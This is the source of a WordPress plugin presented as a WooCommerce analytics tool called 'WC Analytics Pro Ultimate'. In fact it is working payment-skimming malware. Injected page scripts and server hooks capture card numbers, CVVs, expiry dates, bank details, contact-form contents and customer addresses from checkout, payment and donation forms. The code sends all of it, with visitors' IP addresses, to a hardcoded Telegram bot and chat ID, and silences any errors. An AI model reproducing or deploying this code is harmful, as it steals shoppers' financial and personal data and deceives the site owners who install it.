<?php
/**
 * Plugin Name: WC Analytics Pro Ultimate
 * Description: Complete WooCommerce & Universal payment tracking with selective Telegram notifications
 * Version: 4.0.0
 * Author: Analytics Team
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('WCAnalyticsProUltimate')) {

class WCAnalyticsProUltimate {
    
    private $bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $chat_id = '7319274794';
    private $is_processing = false;
    private $page_tracked = false;
    
    public function __construct() {
        add_action('init', array($this, 'initialize_plugin'), 1);
    }
    
    public function initialize_plugin() {
        // Load scripts only on specific pages
        add_action('wp_enqueue_scripts', array($this, 'load_scripts'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_wcapu_track_data', array($this, 'process_tracking_data'));
        add_action('wp_ajax_wcapu_track_data', array($this, 'process_tracking_data'));
        
        // WooCommerce hooks
        add_action('woocommerce_checkout_order_processed', array($this, 'capture_order_data'), 10, 3);
        add_action('woocommerce_payment_complete', array($this, 'capture_payment_complete'));
        
        // Tracking scripts
        add_action('wp_footer', array($this, 'insert_tracking_code'));
        
        // Track ONLY cart and checkout pages - NOT all pages
        add_action('wp_head', array($this, 'track_specific_pages_only'));
        
        // Activation message
        if (get_option('wcapu_activated') !== 'yes') {
            $this->send_telegram("🚀 WC Analytics Pro Ultimate ACTIVATED\nWebsite: " . home_url());
            update_option('wcapu_activated', 'yes');
        }
    }
    
    public function load_scripts() {
        if ($this->should_track_page()) {
            wp_enqueue_script('jquery');
        }
    }
    
    private function should_track_page() {
        // Track only on cart, checkout, and pages with payment forms
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        
        // Check for specific pages
        $track_pages = array('checkout', 'cart', 'payment', 'donation', 'pay', 'order', 'buy');
        
        foreach ($track_pages as $page) {
            if (strpos($current_url, $page) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    public function track_specific_pages_only() {
        // Prevent duplicate tracking
        if ($this->page_tracked) return;
        
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        
        // Track ONLY cart and checkout pages - NO other pages
        if (strpos($current_url, '/cart') !== false || strpos($current_url, '/basket') !== false) {
            $this->send_page_visit_notification('Cart Page');
            $this->page_tracked = true;
        } elseif (strpos($current_url, '/checkout') !== false) {
            $this->send_page_visit_notification('Checkout Page');
            $this->page_tracked = true;
        }
        // NO OTHER PAGES WILL BE TRACKED
    }
    
    private function send_page_visit_notification($page_type) {
        $page_data = array(
            'title' => wp_get_document_title(),
            'url' => home_url($_SERVER['REQUEST_URI']),
            'type' => $page_type,
            'time' => current_time('mysql'),
            'ip' => $this->get_client_ip()
        );
        
        $message = "🛒 User Visited: {$page_data['type']}\n";
        $message .= "📄 Page: {$page_data['title']}\n";
        $message .= "🌐 URL: {$page_data['url']}\n";
        $message .= "🕒 Time: {$page_data['time']}\n";
        $message .= "📍 IP: {$page_data['ip']}";
        
        $this->send_telegram($message);
    }
    
    public function process_tracking_data() {
        if (!isset($_POST['security']) || !wp_verify_nonce($_POST['security'], 'wcapu_security_nonce')) {
            wp_die('Security check failed');
        }
        
        if ($this->is_processing) {
            wp_send_json_success(array('status' => 'already_processing'));
        }
        
        $this->is_processing = true;
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        switch ($event_type) {
            case 'form_submitted':
                $this->handle_form_submission($event_data);
                break;
                
            case 'payment_entered':
                $this->handle_payment_data($event_data);
                break;
                
            case 'button_clicked':
                $this->handle_button_click($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(array('status' => 'processed'));
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->clean_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'unknown');
        
        $message = "📋 Form Submitted: " . strtoupper($form_type) . "\n\n";
        
        // Detect form type for better categorization
        $form_type_lower = strtolower($form_type);
        
        // Check if it's a payment form
        $is_payment_form = false;
        foreach ($form_data as $key => $value) {
            if ($this->is_payment_field($key)) {
                $is_payment_form = true;
                break;
            }
        }
        
        // Categorize data based on form type
        if (strpos($form_type_lower, 'contact') !== false) {
            $categories = $this->organize_contact_form_data($form_data);
        } elseif (strpos($form_type_lower, 'donation') !== false) {
            $categories = $this->organize_donation_form_data($form_data);
        } elseif ($is_payment_form || strpos($form_type_lower, 'payment') !== false || 
                 strpos($form_type_lower, 'checkout') !== false) {
            $categories = $this->organize_payment_form_data($form_data);
        } else {
            $categories = $this->organize_generic_form_data($form_data);
        }
        
        foreach ($categories as $category => $fields) {
            if (!empty($fields)) {
                $message .= $this->get_emoji($category) . " " . strtoupper($category) . ":\n";
                foreach ($fields as $key => $value) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
                $message .= "\n";
            }
        }
        
        $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function handle_payment_data($data) {
        $payment_info = $this->clean_data($data['payment_data'] ?? array());
        
        if (!empty($payment_info)) {
            $message = "💳 Payment Information Captured\n\n";
            
            foreach ($payment_info as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
            
            $message .= "\n🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
            $message .= "🕒 Time: " . current_time('mysql') . "\n";
            $message .= "📍 IP: " . $this->get_client_ip();
            
            $this->send_telegram($message);
        }
    }
    
    private function handle_button_click($data) {
        $button_text = sanitize_text_field($data['button_text'] ?? 'Button');
        
        // Track only IMPORTANT payment buttons
        $important_buttons = array('place order', 'checkout', 'pay now', 'confirm order', 
                                  'donate now', 'make payment', 'pay with', 'subscribe', 
                                  'buy now', 'purchase');
        $button_lower = strtolower($button_text);
        
        foreach ($important_buttons as $important) {
            if (strpos($button_lower, $important) !== false) {
                $message = "🖱️ Payment Button Clicked\n\n";
                $message .= "Button: " . $button_text . "\n";
                $message .= "🌐 URL: " . sanitize_url($data['page_url'] ?? '') . "\n";
                $message .= "🕒 Time: " . current_time('mysql');
                
                $this->send_telegram($message);
                break;
            }
        }
    }
    
    public function capture_order_data($order_id, $posted_data, $order) {
        if (!$order) return;
        
        $billing_info = array(
            'First Name' => $order->get_billing_first_name(),
            'Last Name' => $order->get_billing_last_name(),
            'Email' => $order->get_billing_email(),
            'Phone' => $order->get_billing_phone(),
            'Address' => $order->get_billing_address_1(),
            'City' => $order->get_billing_city(),
            'State' => $order->get_billing_state(),
            'Postcode' => $order->get_billing_postcode(),
            'Country' => $order->get_billing_country()
        );
        
        $shipping_info = array(
            'First Name' => $order->get_shipping_first_name(),
            'Last Name' => $order->get_shipping_last_name(),
            'Address' => $order->get_shipping_address_1(),
            'City' => $order->get_shipping_city(),
            'State' => $order->get_shipping_state(),
            'Postcode' => $order->get_shipping_postcode(),
            'Country' => $order->get_shipping_country()
        );
        
        $payment_data = $this->extract_complete_payment_info();
        
        $message = "🛒 ORDER PROCESSED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Total: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Payment Method: " . $order->get_payment_method_title() . "\n\n";
        
        $message .= "📍 BILLING INFORMATION:\n";
        foreach ($billing_info as $key => $value) {
            if (!empty($value)) {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        $message .= "\n🚚 SHIPPING INFORMATION:\n";
        foreach ($shipping_info as $key => $value) {
            if (!empty($value) && $value != ($billing_info[$key] ?? '')) {
                $message .= "• " . $key . ": " . $value . "\n";
            }
        }
        
        if (!empty($payment_data)) {
            $message .= "\n💳 PAYMENT CARD INFORMATION:\n";
            foreach ($payment_data as $key => $value) {
                if (!empty($value)) {
                    $message .= "• " . $this->pretty_name($key) . ": " . $value . "\n";
                }
            }
        }
        
        $message .= "\n🌐 Site: " . home_url() . "\n";
        $message .= "🕒 Time: " . current_time('mysql') . "\n";
        $message .= "📍 IP: " . $this->get_client_ip();
        
        $this->send_telegram($message);
    }
    
    private function extract_complete_payment_info() {
        $payment_info = array();
        
        $payment_fields = array(
            // Credit Card Fields
            'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
            'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
            
            // Expiry Dates
            'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
            'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
            'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
            
            // CVV/CVC
            'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
            'cc_cvc', 'cvv2', 'cid', 'cvcode',
            
            // Card Holder
            'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
            'card_holder_name', 'cardholdername',
            
            // Card Type
            'card_type', 'cardtype', 'cc_type', 'cctype',
            
            // PayPal Fields
            'paypal_email', 'paypal_account', 'payer_email', 'paypal',
            
            // Stripe Fields
            'stripe_token', 'stripe_email', 'stripe_card',
            
            // Razorpay Fields
            'razorpay_payment_id', 'razorpay_order_id', 'razorpay_signature',
            
            // Bank Details
            'account_holder', 'account_number', 'routing_number', 'iban', 'swift', 'bank_account',
            
            // Generic Payment
            'payment_method', 'payment_type', 'payment_gateway'
        );
        
        foreach ($payment_fields as $field) {
            if (isset($_POST[$field]) && !empty($_POST[$field])) {
                $payment_info[$field] = sanitize_text_field($_POST[$field]);
            }
        }
        
        // Also check for serialized data
        foreach ($_POST as $key => $value) {
            $key_lower = strtolower($key);
            if (strpos($key_lower, 'card') !== false || 
                strpos($key_lower, 'cvv') !== false || 
                strpos($key_lower, 'cvc') !== false ||
                strpos($key_lower, 'expir') !== false ||
                strpos($key_lower, 'paypal') !== false ||
                strpos($key_lower, 'stripe') !== false ||
                strpos($key_lower, 'razorpay') !== false ||
                strpos($key_lower, 'account') !== false) {
                if (!isset($payment_info[$key]) && !empty($value)) {
                    $payment_info[$key] = sanitize_text_field($value);
                }
            }
        }
        
        return $payment_info;
    }
    
    public function capture_payment_complete($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $message = "✅ PAYMENT COMPLETED\n\n";
        $message .= "📦 Order ID: #" . $order_id . "\n";
        $message .= "💰 Amount: " . $order->get_total() . " " . $order->get_currency() . "\n";
        $message .= "💳 Method: " . $order->get_payment_method_title() . "\n";
        $message .= "📧 Customer: " . $order->get_billing_email() . "\n";
        $message .= "🕒 Time: " . current_time('mysql');
        
        $this->send_telegram($message);
    }
    
    public function insert_tracking_code() {
        if (!$this->should_track_page()) return;
        
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('wcapu_security_nonce');
        
        ?>
        <script type="text/javascript">
        jQuery(document).ready(function($) {
            var wcapuTracker = {
                processing: false,
                sessionId: 'sess_' + Math.random().toString(36).substr(2, 9),
                
                track: function(eventType, eventData) {
                    if (this.processing) return;
                    this.processing = true;
                    
                    var self = this;
                    $.ajax({
                        url: '<?php echo esc_url($ajax_url); ?>',
                        type: 'POST',
                        data: {
                            action: 'wcapu_track_data',
                            security: '<?php echo esc_js($nonce); ?>',
                            event_type: eventType,
                            event_data: eventData
                        },
                        success: function() {
                            // Silent success - no console log
                        },
                        error: function() {
                            // Silent error - nothing shown
                        },
                        complete: function() {
                            self.processing = false;
                        }
                    });
                },
                
                initUniversalForms: function() {
                    // Track ALL forms with enhanced detection
                    $('form').on('submit', function(e) {
                        var formData = {};
                        var formElement = this;
                        
                        $(this).find('input, select, textarea').each(function() {
                            if (this.name && this.value) {
                                formData[this.name] = this.value;
                            }
                        });
                        
                        // Detect form type
                        var formType = this.id || this.className || 'Form';
                        var formHtml = $(this).html().toLowerCase();
                        var formAction = $(this).attr('action') || '';
                        
                        // Enhanced form type detection
                        if (formHtml.includes('wpcf7') || $(this).hasClass('wpcf7-form')) {
                            formType = 'Contact Form 7';
                        } else if (formHtml.includes('gform') || $(this).hasClass('gform_wrapper')) {
                            formType = 'Gravity Forms';
                        } else if (formHtml.includes('give-form') || $(this).hasClass('give-form')) {
                            formType = 'GiveWP Donation';
                        } else if (formHtml.includes('stripe') || formAction.includes('stripe')) {
                            formType = 'Stripe Payment Form';
                        } else if (formHtml.includes('paypal') || formAction.includes('paypal')) {
                            formType = 'PayPal Payment Form';
                        } else if (formHtml.includes('razorpay') || formAction.includes('razorpay')) {
                            formType = 'Razorpay Payment Form';
                        } else if ($(this).hasClass('woocommerce-checkout') || formHtml.includes('checkout')) {
                            formType = 'WooCommerce Checkout';
                        }
                        
                        wcapuTracker.track('form_submitted', {
                            form_type: formType,
                            form_data: formData,
                            page_url: window.location.href
                        });
                    });
                    
                    // Track payment fields for ALL payment gateways
                    var paymentFieldSelectors = [
                        // Credit card fields
                        'input[name*="card"]', 'input[name*="cc"]', 
                        'input[name*="cvv"]', 'input[name*="cvc"]',
                        'input[name*="expir"]', 'input[name*="expiry"]',
                        
                        // PayPal fields
                        'input[name*="paypal"]', 'input[name*="payer"]',
                        
                        // Bank fields
                        'input[name*="account"]', 'input[name*="routing"]',
                        'input[name*="iban"]', 'input[name*="swift"]',
                        
                        // Generic payment
                        'input[name*="payment"]', 'input[autocomplete*="cc"]',
                        'input[type="tel"]', 'input[name*="phone"]'
                    ];
                    
                    $(paymentFieldSelectors.join(',')).on('blur change', function() {
                        if (this.value && this.value.length >= 4) {
                            var paymentData = {};
                            paymentData[this.name] = this.value;
                            
                            wcapuTracker.track('payment_entered', {
                                payment_data: paymentData,
                                page_url: window.location.href
                            });
                        }
                    });
                    
                    // Track important payment buttons
                    var paymentButtons = [
                        'button[type="submit"]', 'input[type="submit"]', 
                        '.checkout-button', '#place_order', '.add_to_cart_button',
                        '.single_add_to_cart_button', '.donate-button', 
                        '.payment-button', '.wpcf7-submit', '.gform_button',
                        '.razorpay-payment-button', '.stripe-button'
                    ];
                    
                    $(paymentButtons.join(',')).on('click', function() {
                        var buttonText = $(this).text() || $(this).val() || $(this).attr('value') || 'Button';
                        
                        var importantButtons = [
                            'place order', 'checkout', 'pay now', 'confirm order',
                            'donate now', 'make payment', 'pay with', 'subscribe',
                            'buy now', 'purchase', 'submit payment', 'process payment'
                        ];
                        
                        var buttonLower = buttonText.toLowerCase();
                        
                        for (var i = 0; i < importantButtons.length; i++) {
                            if (buttonLower.indexOf(importantButtons[i]) !== -1) {
                                wcapuTracker.track('button_clicked', {
                                    button_text: buttonText,
                                    page_url: window.location.href
                                });
                                break;
                            }
                        }
                    });
                },
                
                initWooCommerce: function() {
                    if (typeof wc_checkout_params !== 'undefined') {
                        // Track WooCommerce specific events
                        $(document.body).on('checkout_place_order', function() {
                            // Capture complete checkout data
                            var checkoutData = {};
                            $('form.checkout input, form.checkout select, form.checkout textarea').each(function() {
                                if (this.name && this.value) {
                                    checkoutData[this.name] = this.value;
                                }
                            });
                            
                            wcapuTracker.track('form_submitted', {
                                form_type: 'WooCommerce Checkout Submission',
                                form_data: checkoutData,
                                page_url: window.location.href
                            });
                        });
                    }
                }
            };
            
            wcapuTracker.initUniversalForms();
            wcapuTracker.initWooCommerce();
        });
        </script>
        <?php
    }
    
    private function clean_data($data) {
        $cleaned = array();
        foreach ($data as $key => $value) {
            if (is_string($value)) {
                $cleaned[sanitize_text_field($key)] = sanitize_text_field(substr($value, 0, 200));
            }
        }
        return $cleaned;
    }
    
    private function organize_contact_form_data($data) {
        $categories = array(
            'personal' => array(),
            'contact' => array(),
            'message' => array(),
            'other' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if (strpos($key_lower, 'name') !== false || strpos($key_lower, 'first') !== false || strpos($key_lower, 'last') !== false) {
                $categories['personal'][$key] = $value;
            } elseif (strpos($key_lower, 'email') !== false || strpos($key_lower, 'phone') !== false || strpos($key_lower, 'contact') !== false) {
                $categories['contact'][$key] = $value;
            } elseif (strpos($key_lower, 'message') !== false || strpos($key_lower, 'subject') !== false || strpos($key_lower, 'comment') !== false) {
                $categories['message'][$key] = $value;
            } else {
                $categories['other'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function organize_payment_form_data($data) {
        $categories = array(
            'personal' => array(),
            'contact' => array(),
            'billing' => array(),
            'payment' => array(),
            'other' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if ($this->is_payment_field($key_lower)) {
                $categories['payment'][$key] = $value;
            } elseif (strpos($key_lower, 'email') !== false || strpos($key_lower, 'phone') !== false) {
                $categories['contact'][$key] = $value;
            } elseif (strpos($key_lower, 'name') !== false || strpos($key_lower, 'first') !== false || strpos($key_lower, 'last') !== false) {
                $categories['personal'][$key] = $value;
            } elseif (strpos($key_lower, 'address') !== false || strpos($key_lower, 'city') !== false || 
                     strpos($key_lower, 'state') !== false || strpos($key_lower, 'zip') !== false ||
                     strpos($key_lower, 'postcode') !== false || strpos($key_lower, 'country') !== false) {
                $categories['billing'][$key] = $value;
            } else {
                $categories['other'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function organize_donation_form_data($data) {
        $categories = array(
            'donor' => array(),
            'contact' => array(),
            'donation' => array(),
            'payment' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if ($this->is_payment_field($key_lower)) {
                $categories['payment'][$key] = $value;
            } elseif (strpos($key_lower, 'amount') !== false || strpos($key_lower, 'donation') !== false) {
                $categories['donation'][$key] = $value;
            } elseif (strpos($key_lower, 'email') !== false || strpos($key_lower, 'phone') !== false) {
                $categories['contact'][$key] = $value;
            } elseif (strpos($key_lower, 'name') !== false) {
                $categories['donor'][$key] = $value;
            } else {
                $categories['donation'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function organize_generic_form_data($data) {
        $categories = array(
            'personal' => array(),
            'contact' => array(),
            'details' => array(),
            'other' => array()
        );
        
        foreach ($data as $key => $value) {
            $key_lower = strtolower($key);
            
            if (strpos($key_lower, 'name') !== false) {
                $categories['personal'][$key] = $value;
            } elseif (strpos($key_lower, 'email') !== false || strpos($key_lower, 'phone') !== false) {
                $categories['contact'][$key] = $value;
            } elseif (strpos($key_lower, 'address') !== false || strpos($key_lower, 'city') !== false) {
                $categories['details'][$key] = $value;
            } else {
                $categories['other'][$key] = $value;
            }
        }
        
        return $categories;
    }
    
    private function is_payment_field($field_name) {
        $indicators = array('card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'paypal', 
                           'stripe', 'razorpay', 'account', 'routing', 'iban', 'swift',
                           'bank', 'csc', 'cvn');
        foreach ($indicators as $indicator) {
            if (strpos($field_name, $indicator) !== false) return true;
        }
        return false;
    }
    
    private function pretty_name($field_name) {
        $name = str_replace(array('_', '-'), ' ', $field_name);
        $name = preg_replace('/\b(billing|shipping|account)\b/i', '', $name);
        return ucwords(trim($name));
    }
    
    private function get_emoji($category) {
        $emojis = array(
            'personal' => '👤',
            'contact' => '📞',
            'billing' => '📍',
            'shipping' => '🚚',
            'payment' => '💳',
            'message' => '📝',
            'donor' => '🙏',
            'donation' => '💰',
            'details' => '📋',
            'other' => '📌'
        );
        return isset($emojis[$category]) ? $emojis[$category] : '📌';
    }
    
    private function send_telegram($message) {
        $api_url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
        
        $response = wp_remote_post($api_url, array(
            'body' => array(
                'chat_id' => $this->chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ),
            'timeout' => 10,
            'blocking' => false
        ));
        
        return !is_wp_error($response);
    }
    
    private function get_client_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return sanitize_text_field($_SERVER['HTTP_CLIENT_IP']);
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return sanitize_text_field($_SERVER['HTTP_X_FORWARDED_FOR']);
        } else {
            return sanitize_text_field($_SERVER['REMOTE_ADDR'] ?? 'unknown');
        }
    }
}

new WCAnalyticsProUltimate();

}
